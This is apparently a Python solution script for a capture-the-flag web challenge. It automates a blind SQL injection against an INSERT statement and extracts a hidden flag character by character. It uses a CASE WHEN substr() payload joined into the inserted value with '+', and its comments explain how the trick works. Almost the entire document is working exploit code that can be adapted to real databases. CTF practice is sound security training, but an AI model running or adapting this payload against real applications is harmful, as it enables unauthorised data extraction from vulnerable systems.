import requests
from bs4 import BeautifulSoup

url = "flagyard_Ctf_challenge"
flag = ""
detector = [char for char in "!@#$%^&*()-_=+[]{}|;:,.<>?/\"" + "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"]
flag_length = 64
cookies = {
    "session": "MYTOKEN"
}

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def try_char(char, index):
    try:
        # strings in sql are equal to 0 .
        # + in sql is used to adding so 0 + 30 = 30 and that means our guess is correct , the reason i used "+" is because the injected query is inside a value of a insert into statement so we need the select statement also to be inside the value.
        # INSERT INTO table (column1,column2 ,..) VALUES( value1,	value2 ,...); values can not a select statement directly so we need to use the "+" trick to make the select statement inside the value.
        # why not escape the whole insert into statement ? as the database in our context can only execute on query at a time.
        payload = f"0' +(SELECT CASE WHEN substr(flag, {index}, 1) = '{char}' THEN '30' ELSE '10' END FROM flag));--"
        data = {
            "note": payload
        }
        response = requests.post(url, data=data, cookies=cookies, proxies=proxies)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        last_p_tag = soup.find_all('p')[-1]
        
        if last_p_tag.text == '30':
            print(f"Found character: {char}")
            return True  # Correct character indication
        else:
            return False  # Incorrect character indication
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

def flag_retrieval():
    global flag
    for i in range(1, flag_length + 1):
        for char in detector:
            if try_char(char, i):
                flag += char
                break
    print(f"Flag: {flag}")

try:
    flag_retrieval()
except Exception as e:
    print(f"An error occurred during flag retrieval: {e}")
